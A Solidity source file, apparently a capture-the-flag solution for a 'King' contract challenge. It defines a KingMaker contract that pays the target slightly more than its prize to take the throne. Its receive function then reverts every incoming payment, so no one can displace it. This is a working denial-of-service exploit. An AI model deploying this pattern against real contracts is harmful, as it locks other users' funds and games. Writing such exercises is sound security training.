// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "src/king/King.sol";

contract KingMaker {
    King king = King(payable(0xe650403d1fe6B13625E07392ae0021C036b7f978));

    receive() external payable {
        revert("nope");
    }

    function makeKing() external payable {
        // Using call to send Ether and forward all available gas
        (bool success, ) = payable(address(king)).call{
            value: king.prize() + 1 wei
        }("");
        require(success, "Failed to make king");
    }
}
